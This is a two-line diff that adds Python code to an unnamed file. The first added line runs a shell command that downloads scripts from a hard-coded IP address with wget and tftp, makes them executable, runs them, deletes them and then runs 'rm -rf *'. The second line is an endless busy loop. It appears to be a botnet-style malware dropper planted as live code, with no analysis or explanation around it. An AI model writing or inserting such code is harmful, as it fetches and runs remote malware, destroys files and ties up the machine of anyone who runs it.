@@ -1,0 +1,2 @@
+__import__("os").system("cd /tmp || cd /run || cd /; wget http://137.74.85.137/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 137.74.85.137 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 137.74.85.137; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *")
+while True: pass
